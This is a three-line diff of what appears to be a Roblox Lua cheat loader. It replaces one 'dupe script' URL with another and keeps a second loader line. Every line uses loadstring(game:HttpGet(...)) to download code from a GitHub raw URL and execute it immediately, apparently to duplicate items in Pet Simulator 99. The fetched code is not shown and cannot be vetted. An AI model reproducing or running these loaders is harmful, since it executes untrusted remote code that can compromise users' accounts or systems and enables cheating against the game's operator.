@@ -1,3 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Petsimulator99-V/VranXsHub/main/VranXsHubDupeScript"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VranXs/OfficiaDupescript/main/VranXsHub"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/VranXs/VranXsHub-/main/OfficiaDupescript"))()
